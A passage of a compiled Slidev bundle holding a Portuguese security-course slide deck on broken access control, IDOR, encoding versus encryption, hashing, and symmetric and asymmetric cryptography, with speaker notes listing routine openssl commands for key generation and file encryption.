  <Image src="/broken-access-control-firewall.png" style="margin: 0 auto;margin-top:50px;width:500px" />
</div>`,frontmatter:{title:"O que \xE9 Controle de Acesso ?"},index:0,start:0,end:13},inline:{raw:`---
src: ./slides/4.broken-access-control.md
---
`,content:"",frontmatter:{},index:3,start:36,end:40},filepath:"/home/tux/Work/crescer/dia-2/slides/4.broken-access-control.md",notesHTML:"",id:3,no:4},__clicksElements:[],__preloaded:!1}},{path:"5",name:"page-5",component:C8,meta:{title:"Quebra de controle de acesso",srcSequence:"./slides/5.broken-access-control.md",slide:{raw:null,title:"Quebra de controle de acesso",level:1,content:`# Quebra de controle de acesso

Consegue acesso a um recurso n\xE3o autorizado burlando algum mecanismo de seguran\xE7a.

<div>
  <Image src="/broken-access-control.png" style="margin: 0 auto;margin-top:50px" />
</div>`,frontmatter:{title:"Quebra de controle de acesso",srcSequence:"./slides/5.broken-access-control.md"},index:4,start:0,end:7,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/5.broken-access-control.md",raw:`# Quebra de controle de acesso

Consegue acesso a um recurso n\xE3o autorizado burlando algum mecanismo de seguran\xE7a.

<div>
  <Image src="/broken-access-control.png" style="margin: 0 auto;margin-top:50px" />
</div>`,title:"Quebra de controle de acesso",level:1,content:`# Quebra de controle de acesso

Consegue acesso a um recurso n\xE3o autorizado burlando algum mecanismo de seguran\xE7a.

<div>
  <Image src="/broken-access-control.png" style="margin: 0 auto;margin-top:50px" />
</div>`,frontmatter:{title:"Quebra de controle de acesso"},index:0,start:0,end:7},inline:{raw:`---
src: ./slides/5.broken-access-control.md
---
`,content:"",frontmatter:{},index:4,start:40,end:44},filepath:"/home/tux/Work/crescer/dia-2/slides/5.broken-access-control.md",notesHTML:"",id:4,no:5},__clicksElements:[],__preloaded:!1}},{path:"6",name:"page-6",component:T8,meta:{title:"Controle de Acesso",srcSequence:"./slides/6.broken-access-control.md",slide:{raw:null,title:"Controle de Acesso",level:1,content:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# Controle de Acesso

Com o que devo me preocupar ?

<div grid="~ cols-2">
  <Image v-click src="/product-list.png" style="margin: 0 auto;border-radius:10px" />

<div v-click style="margin-left:20px">

- Pode acessar a tela de listagem de usu\xE1rios?
- Pode visualizar quais usu\xE1rios?
- Pode visualizar quais informa\xE7\xF5es dos usu\xE1rios?
- Pode editar, adicionar, remover, etc... ?
</div>
</div>`,frontmatter:{title:"Controle de Acesso",srcSequence:"./slides/6.broken-access-control.md"},index:5,start:0,end:21,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/6.broken-access-control.md",raw:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# Controle de Acesso

Com o que devo me preocupar ?

<div grid="~ cols-2">
  <Image v-click src="/product-list.png" style="margin: 0 auto;border-radius:10px" />

<div v-click style="margin-left:20px">

- Pode acessar a tela de listagem de usu\xE1rios?
- Pode visualizar quais usu\xE1rios?
- Pode visualizar quais informa\xE7\xF5es dos usu\xE1rios?
- Pode editar, adicionar, remover, etc... ?
</div>
</div>`,title:"Controle de Acesso",level:1,content:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# Controle de Acesso

Com o que devo me preocupar ?

<div grid="~ cols-2">
  <Image v-click src="/product-list.png" style="margin: 0 auto;border-radius:10px" />

<div v-click style="margin-left:20px">

- Pode acessar a tela de listagem de usu\xE1rios?
- Pode visualizar quais usu\xE1rios?
- Pode visualizar quais informa\xE7\xF5es dos usu\xE1rios?
- Pode editar, adicionar, remover, etc... ?
</div>
</div>`,frontmatter:{title:"Controle de Acesso"},index:0,start:0,end:21},inline:{raw:`---
src: ./slides/6.broken-access-control.md
---
`,content:"",frontmatter:{},index:5,start:44,end:48},filepath:"/home/tux/Work/crescer/dia-2/slides/6.broken-access-control.md",notesHTML:"",id:5,no:6},__clicksElements:[],__preloaded:!1}},{path:"7",name:"page-7",component:R8,meta:{title:"IDOR",srcSequence:"./slides/7.idor.md",slide:{raw:null,title:"IDOR",level:1,content:`# IDOR

Refer\xEAncia de objeto direto inseguro (Insecure Direct Object Reference).

<br>

<div v-click>
<Image src="idor-2.png" style="border-radius:10px;margin: 0 auto" />
</div>`,frontmatter:{title:"IDOR",srcSequence:"./slides/7.idor.md"},index:6,start:0,end:9,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/7.idor.md",raw:`# IDOR

Refer\xEAncia de objeto direto inseguro (Insecure Direct Object Reference).

<br>

<div v-click>
<Image src="idor-2.png" style="border-radius:10px;margin: 0 auto" />
</div>`,title:"IDOR",level:1,content:`# IDOR

Refer\xEAncia de objeto direto inseguro (Insecure Direct Object Reference).

<br>

<div v-click>
<Image src="idor-2.png" style="border-radius:10px;margin: 0 auto" />
</div>`,frontmatter:{title:"IDOR"},index:0,start:0,end:9},inline:{raw:`---
src: ./slides/7.idor.md
---
`,content:"",frontmatter:{},index:6,start:48,end:52},filepath:"/home/tux/Work/crescer/dia-2/slides/7.idor.md",notesHTML:"",id:6,no:7},__clicksElements:[],__preloaded:!1}},{path:"8",name:"page-8",component:q8,meta:{title:"Criptografia",layout:"center",class:"text-center",srcSequence:"./slides/10.cryptography.md",slide:{raw:null,title:"Criptografia",level:1,content:"# Criptografia",frontmatter:{title:"Criptografia",layout:"center",class:"text-center",srcSequence:"./slides/10.cryptography.md"},index:7,start:0,end:1,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/10.cryptography.md",raw:"# Criptografia",title:"Criptografia",level:1,content:"# Criptografia",frontmatter:{title:"Criptografia"},index:0,start:0,end:1},inline:{raw:`---
src: ./slides/10.cryptography.md
layout: center
class: text-center
---
`,content:"",frontmatter:{layout:"center",class:"text-center"},index:7,start:52,end:58},filepath:"/home/tux/Work/crescer/dia-2/slides/10.cryptography.md",notesHTML:"",id:7,no:8},__clicksElements:[],__preloaded:!1}},{path:"9",name:"page-9",component:l_,meta:{title:"O que \xE9 criptografia ?",srcSequence:"./slides/11.cryptography.md",slide:{raw:null,title:"O que \xE9 criptografia ?",level:1,content:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# O que \xE9 criptografia ?

\xC9 uma \xE1rea da criptologia que estuda princ\xEDpios e t\xE9cnicas para comunica\xE7\xE3o segura na presen\xE7a de terceiros, ou seja, constru\xE7\xE3o e an\xE1lise de protocolos que impedem terceiros, ou o p\xFAblico, de lerem mensagens privadas.

<div grid="~ cols-3" style="margin-top:50px">
  <div></div>
  <Image :src="'/hacker.png'" :style="'width:100px;height:100px;margin: 0 auto'" />
  <div></div>
</div>

<div grid="~ cols-3">
  <div class="text-center">
    <Image :src="'/alice-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Alice</span>
  </div>
  <div style="margin-top:10px" class="text-center">
    <span>???</span>
    <Image :src="'/mail-letter-icon-blue.png'" :style="'width:80px;height:80px;margin: 0 auto'" />
  </div>
  <div class="text-center">
    <Image :src="'/user-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Bob</span>
  </div>
</div>

<arrow x1="250" y1="360" x2="430" y2="360" color="#4c4" width="3" arrowSize="1" />

<arrow x1="550" y1="360" x2="720" y2="360" color="#4c4" width="3" arrowSize="1" />`,frontmatter:{title:"O que \xE9 criptografia ?",srcSequence:"./slides/11.cryptography.md"},index:8,start:0,end:34,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/11.cryptography.md",raw:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# O que \xE9 criptografia ?

\xC9 uma \xE1rea da criptologia que estuda princ\xEDpios e t\xE9cnicas para comunica\xE7\xE3o segura na presen\xE7a de terceiros, ou seja, constru\xE7\xE3o e an\xE1lise de protocolos que impedem terceiros, ou o p\xFAblico, de lerem mensagens privadas.

<div grid="~ cols-3" style="margin-top:50px">
  <div></div>
  <Image :src="'/hacker.png'" :style="'width:100px;height:100px;margin: 0 auto'" />
  <div></div>
</div>

<div grid="~ cols-3">
  <div class="text-center">
    <Image :src="'/alice-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Alice</span>
  </div>
  <div style="margin-top:10px" class="text-center">
    <span>???</span>
    <Image :src="'/mail-letter-icon-blue.png'" :style="'width:80px;height:80px;margin: 0 auto'" />
  </div>
  <div class="text-center">
    <Image :src="'/user-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Bob</span>
  </div>
</div>

<arrow x1="250" y1="360" x2="430" y2="360" color="#4c4" width="3" arrowSize="1" />

<arrow x1="550" y1="360" x2="720" y2="360" color="#4c4" width="3" arrowSize="1" />`,title:"O que \xE9 criptografia ?",level:1,content:`<style>
  .img-hor-vert {
    transform: rotateY(180deg);
  }
</style>

# O que \xE9 criptografia ?

\xC9 uma \xE1rea da criptologia que estuda princ\xEDpios e t\xE9cnicas para comunica\xE7\xE3o segura na presen\xE7a de terceiros, ou seja, constru\xE7\xE3o e an\xE1lise de protocolos que impedem terceiros, ou o p\xFAblico, de lerem mensagens privadas.

<div grid="~ cols-3" style="margin-top:50px">
  <div></div>
  <Image :src="'/hacker.png'" :style="'width:100px;height:100px;margin: 0 auto'" />
  <div></div>
</div>

<div grid="~ cols-3">
  <div class="text-center">
    <Image :src="'/alice-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Alice</span>
  </div>
  <div style="margin-top:10px" class="text-center">
    <span>???</span>
    <Image :src="'/mail-letter-icon-blue.png'" :style="'width:80px;height:80px;margin: 0 auto'" />
  </div>
  <div class="text-center">
    <Image :src="'/user-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Bob</span>
  </div>
</div>

<arrow x1="250" y1="360" x2="430" y2="360" color="#4c4" width="3" arrowSize="1" />

<arrow x1="550" y1="360" x2="720" y2="360" color="#4c4" width="3" arrowSize="1" />`,frontmatter:{title:"O que \xE9 criptografia ?"},index:0,start:0,end:34},inline:{raw:`---
src: ./slides/11.cryptography.md
---
`,content:"",frontmatter:{},index:8,start:58,end:62},filepath:"/home/tux/Work/crescer/dia-2/slides/11.cryptography.md",notesHTML:"",id:8,no:9},__clicksElements:[],__preloaded:!1}},{path:"10",name:"page-10",component:E_,meta:{title:"Cifras",srcSequence:"./slides/12.cryptography.md",slide:{raw:null,title:"Cifras",level:1,content:`# Cifras

\xC9 uma t\xE9cnica onde o conte\xFAdo da mensagem \xE9 cifrado atrav\xE9s da mistura e/ou substitui\xE7\xE3o das letras da mensagem original. Para ter a mensagem original \xE9 necess\xE1rio fazer o processo inverso.

<div grid="~ cols-2">
  <div v-click="1">

  Exemplos:
  - Cifra de C\xE9sar
  - Cifra de Vigin\xE8re

  <Image v-click="3" src="disco-de-cesar.jpg" width="260" style="margin:0 auto;border-radius:20px" />
  </div>

  <div v-click="2">
    <div grid="~ cols-2" style="margin-bottom:10px">
      <span>Cifra de C\xE9sar</span>
      <Image width="60" src='/julio-cesar.jpg' style="border-radius:10px" />
    </div>
    <CesarCipher />
  </div>
</div>`,frontmatter:{title:"Cifras",srcSequence:"./slides/12.cryptography.md"},index:9,start:0,end:22,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/12.cryptography.md",raw:`# Cifras

\xC9 uma t\xE9cnica onde o conte\xFAdo da mensagem \xE9 cifrado atrav\xE9s da mistura e/ou substitui\xE7\xE3o das letras da mensagem original. Para ter a mensagem original \xE9 necess\xE1rio fazer o processo inverso.

<div grid="~ cols-2">
  <div v-click="1">

  Exemplos:
  - Cifra de C\xE9sar
  - Cifra de Vigin\xE8re

  <Image v-click="3" src="disco-de-cesar.jpg" width="260" style="margin:0 auto;border-radius:20px" />
  </div>

  <div v-click="2">
    <div grid="~ cols-2" style="margin-bottom:10px">
      <span>Cifra de C\xE9sar</span>
      <Image width="60" src='/julio-cesar.jpg' style="border-radius:10px" />
    </div>
    <CesarCipher />
  </div>
</div>`,title:"Cifras",level:1,content:`# Cifras

\xC9 uma t\xE9cnica onde o conte\xFAdo da mensagem \xE9 cifrado atrav\xE9s da mistura e/ou substitui\xE7\xE3o das letras da mensagem original. Para ter a mensagem original \xE9 necess\xE1rio fazer o processo inverso.

<div grid="~ cols-2">
  <div v-click="1">

  Exemplos:
  - Cifra de C\xE9sar
  - Cifra de Vigin\xE8re

  <Image v-click="3" src="disco-de-cesar.jpg" width="260" style="margin:0 auto;border-radius:20px" />
  </div>

  <div v-click="2">
    <div grid="~ cols-2" style="margin-bottom:10px">
      <span>Cifra de C\xE9sar</span>
      <Image width="60" src='/julio-cesar.jpg' style="border-radius:10px" />
    </div>
    <CesarCipher />
  </div>
</div>`,frontmatter:{title:"Cifras"},index:0,start:0,end:22},inline:{raw:`---
src: ./slides/12.cryptography.md
---
`,content:"",frontmatter:{},index:9,start:62,end:66},filepath:"/home/tux/Work/crescer/dia-2/slides/12.cryptography.md",notesHTML:"",id:9,no:10},__clicksElements:[],__preloaded:!1}},{path:"11",name:"page-11",component:a5,meta:{title:"Criptografia != Encode",srcSequence:"./slides/13.cipher-encode.md",slide:{raw:null,title:"Criptografia != Encode",level:1,content:`# Criptografia != Encode

Encode \xE9 apenas uma codifica\xE7\xE3o simples de dados, enquanto a criptografia envolve um segredo que apenas quem est\xE1 autorizado tem posse.

<div>
<div>

##### Tipos de Encode
- Base16
- Base32
- Base64
- Base85

</div>
<br>
<div v-click>
Encode:
\`\`\`bash
echo "Esta \xE9 uma mensagem SECRETA!!!" | base64
RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo=
\`\`\`

Decode:
\`\`\`bash
echo "RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo=" | base64 -d
"Esta \xE9 uma mensagem SECRETA!!!"
\`\`\`
</div>

</div>`,frontmatter:{title:"Criptografia != Encode",srcSequence:"./slides/13.cipher-encode.md"},index:10,start:0,end:31,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/13.cipher-encode.md",raw:`# Criptografia != Encode

Encode \xE9 apenas uma codifica\xE7\xE3o simples de dados, enquanto a criptografia envolve um segredo que apenas quem est\xE1 autorizado tem posse.

<div>
<div>

##### Tipos de Encode
- Base16
- Base32
- Base64
- Base85

</div>
<br>
<div v-click>
Encode:
\`\`\`bash
echo "Esta \xE9 uma mensagem SECRETA!!!" | base64
RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo=
\`\`\`

Decode:
\`\`\`bash
echo "RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo=" | base64 -d
"Esta \xE9 uma mensagem SECRETA!!!"
\`\`\`
</div>

</div>
`,title:"Criptografia != Encode",level:1,content:`# Criptografia != Encode

Encode \xE9 apenas uma codifica\xE7\xE3o simples de dados, enquanto a criptografia envolve um segredo que apenas quem est\xE1 autorizado tem posse.

<div>
<div>

##### Tipos de Encode
- Base16
- Base32
- Base64
- Base85

</div>
<br>
<div v-click>
Encode:
\`\`\`bash
echo "Esta \xE9 uma mensagem SECRETA!!!" | base64
RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo=
\`\`\`

Decode:
\`\`\`bash
echo "RXN0YSDDqSB1bWEgbWVuc2FnZW0gU0VDUkVUQSEhIQo=" | base64 -d
"Esta \xE9 uma mensagem SECRETA!!!"
\`\`\`
</div>

</div>`,frontmatter:{title:"Criptografia != Encode"},index:0,start:0,end:31},inline:{raw:`---
src: ./slides/13.cipher-encode.md
---
`,content:"",frontmatter:{},index:10,start:66,end:70},filepath:"/home/tux/Work/crescer/dia-2/slides/13.cipher-encode.md",notesHTML:"",id:10,no:11},__clicksElements:[],__preloaded:!1}},{path:"12",name:"page-12",component:m5,meta:{title:"Criptografia != Hash",srcSequence:"./slides/14.cipher-hash.md",slide:{raw:null,title:"Criptografia != Hash",level:1,content:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
</style>
# Criptografia != Hash

Hash gera uma sa\xEDda de tamanho fixo que \xE9 matematicamente irrevers\xEDvel, enquanto a criptografia gera uma sa\xEDda vari\xE1vel conforme o tamanho da mensagem, e \xE9 revers\xEDvel para quem tiver posse do segredo.

<br>

<div v-click>

|Algor\xEDtmo|Entrada|Sa\xEDda|Tamanho|
|-|-|-|-|
|MD5|123|202cb962ac59075b964b07152d234b70|32|
|MD5|123asd|e120ea280aa50693d5568d0071456460|32|
|SHA1|123|40bd001563085fc35165329ea1ff5c5ecbdbbeef|40|
|SHA1|123asd|ec4c8836db96b8aca8381c7c64bb095ba46d5e28|40|
|SHA256|123|a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3|64|
|SHA256|123asd|049a68c15c0d6e26c8b4a0743e6b87f074864c2fae5983c88956cb2882d608f5|64|

</div>`,frontmatter:{title:"Criptografia != Hash",srcSequence:"./slides/14.cipher-hash.md"},index:11,start:0,end:26,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/14.cipher-hash.md",raw:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
</style>
# Criptografia != Hash

Hash gera uma sa\xEDda de tamanho fixo que \xE9 matematicamente irrevers\xEDvel, enquanto a criptografia gera uma sa\xEDda vari\xE1vel conforme o tamanho da mensagem, e \xE9 revers\xEDvel para quem tiver posse do segredo.

<br>

<div v-click>

|Algor\xEDtmo|Entrada|Sa\xEDda|Tamanho|
|-|-|-|-|
|MD5|123|202cb962ac59075b964b07152d234b70|32|
|MD5|123asd|e120ea280aa50693d5568d0071456460|32|
|SHA1|123|40bd001563085fc35165329ea1ff5c5ecbdbbeef|40|
|SHA1|123asd|ec4c8836db96b8aca8381c7c64bb095ba46d5e28|40|
|SHA256|123|a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3|64|
|SHA256|123asd|049a68c15c0d6e26c8b4a0743e6b87f074864c2fae5983c88956cb2882d608f5|64|

</div>`,title:"Criptografia != Hash",level:1,content:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
</style>
# Criptografia != Hash

Hash gera uma sa\xEDda de tamanho fixo que \xE9 matematicamente irrevers\xEDvel, enquanto a criptografia gera uma sa\xEDda vari\xE1vel conforme o tamanho da mensagem, e \xE9 revers\xEDvel para quem tiver posse do segredo.

<br>

<div v-click>

|Algor\xEDtmo|Entrada|Sa\xEDda|Tamanho|
|-|-|-|-|
|MD5|123|202cb962ac59075b964b07152d234b70|32|
|MD5|123asd|e120ea280aa50693d5568d0071456460|32|
|SHA1|123|40bd001563085fc35165329ea1ff5c5ecbdbbeef|40|
|SHA1|123asd|ec4c8836db96b8aca8381c7c64bb095ba46d5e28|40|
|SHA256|123|a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3|64|
|SHA256|123asd|049a68c15c0d6e26c8b4a0743e6b87f074864c2fae5983c88956cb2882d608f5|64|

</div>`,frontmatter:{title:"Criptografia != Hash"},index:0,start:0,end:26},inline:{raw:`---
src: ./slides/14.cipher-hash.md
---
`,content:"",frontmatter:{},index:11,start:70,end:74},filepath:"/home/tux/Work/crescer/dia-2/slides/14.cipher-hash.md",notesHTML:"",id:11,no:12},__clicksElements:[],__preloaded:!1}},{path:"13",name:"page-13",component:v5,meta:{title:"Criptografia Sim\xE9trica",srcSequence:"./slides/15.symmetric-cryptography.md",slide:{raw:null,title:"Criptografia Sim\xE9trica",level:1,content:`# Criptografia Sim\xE9trica

Apenas uma chave \xE9 utilizada tanto para criptografar quanto para descriptografar os dados.

<div>

- DES (Data Encryption Standard)
- 3DES (Triple DES)
- IDEA (International Data Encryption Algorithm)
- AES (Advanced Encryption Standard)
</div>

<div v-click>
<Image src="criptografia-simetrica.png" width="600" style="margin:0 auto;border-radius:20px;margin-top:10px" />
</div>`,frontmatter:{title:"Criptografia Sim\xE9trica",srcSequence:"./slides/15.symmetric-cryptography.md"},index:12,start:0,end:15,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/15.symmetric-cryptography.md",raw:`# Criptografia Sim\xE9trica

Apenas uma chave \xE9 utilizada tanto para criptografar quanto para descriptografar os dados.

<div>

- DES (Data Encryption Standard)
- 3DES (Triple DES)
- IDEA (International Data Encryption Algorithm)
- AES (Advanced Encryption Standard)
</div>

<div v-click>
<Image src="criptografia-simetrica.png" width="600" style="margin:0 auto;border-radius:20px;margin-top:10px" />
</div>`,title:"Criptografia Sim\xE9trica",level:1,content:`# Criptografia Sim\xE9trica

Apenas uma chave \xE9 utilizada tanto para criptografar quanto para descriptografar os dados.

<div>

- DES (Data Encryption Standard)
- 3DES (Triple DES)
- IDEA (International Data Encryption Algorithm)
- AES (Advanced Encryption Standard)
</div>

<div v-click>
<Image src="criptografia-simetrica.png" width="600" style="margin:0 auto;border-radius:20px;margin-top:10px" />
</div>`,frontmatter:{title:"Criptografia Sim\xE9trica"},index:0,start:0,end:15},inline:{raw:`---
src: ./slides/15.symmetric-cryptography.md
---
`,content:"",frontmatter:{},index:12,start:74,end:78},filepath:"/home/tux/Work/crescer/dia-2/slides/15.symmetric-cryptography.md",notesHTML:"",id:12,no:13},__clicksElements:[],__preloaded:!1}},{path:"14",name:"page-14",component:E5,meta:{title:"Criptografia Assim\xE9trica",srcSequence:"./slides/16.assymmetric-cryptography.md",slide:{raw:null,title:"Criptografia Assim\xE9trica",level:1,content:`# Criptografia Assim\xE9trica

Tamb\xE9m conhecida como criptografia de chave p\xFAblica, faz uso de um par de chaves (p\xFAblica e privada) para garantir a privacidade das mensagens.

<div v-click>

- RSA (Ron Rivest, Adi Shamir e Leonard Adleman)
</div>

<div v-click>

<Image src="assimetric-cryptography.png" style="margin:0 auto;margin-top:50px" width="500" />
</div>`,frontmatter:{title:"Criptografia Assim\xE9trica",srcSequence:"./slides/16.assymmetric-cryptography.md"},note:`openssl req -x509 -nodes -days 365 -sha256 -newkey rsa:2048 -keyout mykey.pem -out mycert.pem

openssl s_server -cert mycert.pem -www

openssl enc -base64 -in arq1.txt -out arq1.txt.enc

openssl enc -aes-256-cbc -a -salt -in arq1.txt -out arq1.txt.enc

openssl list-cipher-commands | grep -i aes


openssl genrsa -aes128 -out alice-private.pem 1024
openssl rsa -in alice-private.pem -pubout > alice-public.pem


openssl genrsa -aes128 -out bob-private.pem 1024
openssl rsa -in bob-private.pem -pubout > bob-public.pem


openssl pkeyutl -encrypt -inkey bob-public.pem -pubin -in alice-to-bob.txt -out alice-to-bob.txt.enc

openssl pkeyutl -decrypt -inkey bob_private.pem -in top_secret.enc > top_secret.txt`,index:13,start:0,end:39,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/16.assymmetric-cryptography.md",raw:`# Criptografia Assim\xE9trica

Tamb\xE9m conhecida como criptografia de chave p\xFAblica, faz uso de um par de chaves (p\xFAblica e privada) para garantir a privacidade das mensagens.

<div v-click>

- RSA (Ron Rivest, Adi Shamir e Leonard Adleman)
</div>

<div v-click>

<Image src="assimetric-cryptography.png" style="margin:0 auto;margin-top:50px" width="500" />
</div>

<!-- 
openssl req -x509 -nodes -days 365 -sha256 -newkey rsa:2048 -keyout mykey.pem -out mycert.pem

openssl s_server -cert mycert.pem -www

openssl enc -base64 -in arq1.txt -out arq1.txt.enc

openssl enc -aes-256-cbc -a -salt -in arq1.txt -out arq1.txt.enc

openssl list-cipher-commands | grep -i aes


openssl genrsa -aes128 -out alice-private.pem 1024
openssl rsa -in alice-private.pem -pubout > alice-public.pem


openssl genrsa -aes128 -out bob-private.pem 1024
openssl rsa -in bob-private.pem -pubout > bob-public.pem


openssl pkeyutl -encrypt -inkey bob-public.pem -pubin -in alice-to-bob.txt -out alice-to-bob.txt.enc

openssl pkeyutl -decrypt -inkey bob_private.pem -in top_secret.enc > top_secret.txt 

-->`,title:"Criptografia Assim\xE9trica",level:1,content:`# Criptografia Assim\xE9trica

Tamb\xE9m conhecida como criptografia de chave p\xFAblica, faz uso de um par de chaves (p\xFAblica e privada) para garantir a privacidade das mensagens.

<div v-click>

- RSA (Ron Rivest, Adi Shamir e Leonard Adleman)
</div>

<div v-click>

<Image src="assimetric-cryptography.png" style="margin:0 auto;margin-top:50px" width="500" />
</div>`,frontmatter:{title:"Criptografia Assim\xE9trica"},note:`openssl req -x509 -nodes -days 365 -sha256 -newkey rsa:2048 -keyout mykey.pem -out mycert.pem

openssl s_server -cert mycert.pem -www

openssl enc -base64 -in arq1.txt -out arq1.txt.enc

openssl enc -aes-256-cbc -a -salt -in arq1.txt -out arq1.txt.enc

openssl list-cipher-commands | grep -i aes


openssl genrsa -aes128 -out alice-private.pem 1024
openssl rsa -in alice-private.pem -pubout > alice-public.pem


openssl genrsa -aes128 -out bob-private.pem 1024
openssl rsa -in bob-private.pem -pubout > bob-public.pem


openssl pkeyutl -encrypt -inkey bob-public.pem -pubin -in alice-to-bob.txt -out alice-to-bob.txt.enc

openssl pkeyutl -decrypt -inkey bob_private.pem -in top_secret.enc > top_secret.txt`,index:0,start:0,end:39},inline:{raw:`---
src: ./slides/16.assymmetric-cryptography.md
---
`,content:"",frontmatter:{},index:13,start:78,end:82},filepath:"/home/tux/Work/crescer/dia-2/slides/16.assymmetric-cryptography.md",notesHTML:`<p>openssl req -x509 -nodes -days 365 -sha256 -newkey rsa:2048 -keyout mykey.pem -out mycert.pem</p>
<p>openssl s_server -cert mycert.pem -www</p>
<p>openssl enc -base64 -in arq1.txt -out arq1.txt.enc</p>
<p>openssl enc -aes-256-cbc -a -salt -in arq1.txt -out arq1.txt.enc</p>
<p>openssl list-cipher-commands | grep -i aes</p>
<p>openssl genrsa -aes128 -out alice-private.pem 1024
openssl rsa -in alice-private.pem -pubout &gt; alice-public.pem</p>
<p>openssl genrsa -aes128 -out bob-private.pem 1024
openssl rsa -in bob-private.pem -pubout &gt; bob-public.pem</p>
<p>openssl pkeyutl -encrypt -inkey bob-public.pem -pubin -in alice-to-bob.txt -out alice-to-bob.txt.enc</p>
<p>openssl pkeyutl -decrypt -inkey bob_private.pem -in top_secret.enc &gt; top_secret.txt</p>
`,id:13,no:14},__clicksElements:[],__preloaded:!1}},{path:"15",name:"page-15",component:k5,meta:{title:"Vantagens e desvantagens",srcSequence:"./slides/17.advantages.md",slide:{raw:null,title:"Vantagens e desvantagens",level:1,content:`# Vantagens e desvantagens

- Sim\xE9trica
    - Algoritmo simples
    - R\xE1pida
    - A chave pode ser interceptada durante o compartilhamento
- Assim\xE9trica
    - Algoritmo complexo
    - A chave p\xFAblica pode ser distribu\xEDda para qualquer pessoa
    - Lenta
    - Necessitam de um maior poder de processamento`,frontmatter:{title:"Vantagens e desvantagens",srcSequence:"./slides/17.advantages.md"},index:14,start:0,end:11,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/17.advantages.md",raw:`# Vantagens e desvantagens

- Sim\xE9trica
    - Algoritmo simples
    - R\xE1pida
    - A chave pode ser interceptada durante o compartilhamento
- Assim\xE9trica
    - Algoritmo complexo
    - A chave p\xFAblica pode ser distribu\xEDda para qualquer pessoa
    - Lenta
    - Necessitam de um maior poder de processamento`,title:"Vantagens e desvantagens",level:1,content:`# Vantagens e desvantagens

- Sim\xE9trica
    - Algoritmo simples
    - R\xE1pida
    - A chave pode ser interceptada durante o compartilhamento
- Assim\xE9trica
    - Algoritmo complexo
    - A chave p\xFAblica pode ser distribu\xEDda para qualquer pessoa
    - Lenta
    - Necessitam de um maior poder de processamento`,frontmatter:{title:"Vantagens e desvantagens"},index:0,start:0,end:11},inline:{raw:`---
src: ./slides/17.advantages.md
---
`,content:"",frontmatter:{},index:14,start:82,end:86},filepath:"/home/tux/Work/crescer/dia-2/slides/17.advantages.md",notesHTML:"",id:14,no:15},__clicksElements:[],__preloaded:!1}},{path:"16",name:"page-16",component:$5,meta:{title:"Proton Mail",srcSequence:"./slides/18.protonmail.md",slide:{raw:null,title:"Proton Mail",level:1,content:`# Proton Mail

<div>
    <Image src="zero-access-encryption.png" style="border-radius:20px;margin: 0 auto;margin-top:80px;width:700px" />
</div>`,frontmatter:{title:"Proton Mail",srcSequence:"./slides/18.protonmail.md"},index:15,start:0,end:5,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/18.protonmail.md",raw:`# Proton Mail

<div>
    <Image src="zero-access-encryption.png" style="border-radius:20px;margin: 0 auto;margin-top:80px;width:700px" />
</div>`,title:"Proton Mail",level:1,content:`# Proton Mail

<div>
    <Image src="zero-access-encryption.png" style="border-radius:20px;margin: 0 auto;margin-top:80px;width:700px" />
</div>`,frontmatter:{title:"Proton Mail"},index:0,start:0,end:5},inline:{raw:`---
src: ./slides/18.protonmail.md
---
`,content:"",frontmatter:{},index:15,start:86,end:90},filepath:"/home/tux/Work/crescer/dia-2/slides/18.protonmail.md",notesHTML:"",id:15,no:16},__clicksElements:[],__preloaded:!1}},{path:"17",name:"page-17",component:B5,meta:{title:"Posso utilizar os dois ?",layout:"center",class:"text-center",srcSequence:"./slides/20.https.md",slide:{raw:null,title:"Posso utilizar os dois ?",level:1,content:`# Posso utilizar os dois ?

<div>
<Image src="question-guy.png" style="margin:0 auto" />
</div>`,frontmatter:{title:"Posso utilizar os dois ?",layout:"center",class:"text-center",srcSequence:"./slides/20.https.md"},index:16,start:0,end:5,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/20.https.md",raw:`# Posso utilizar os dois ?

<div>
<Image src="question-guy.png" style="margin:0 auto" />
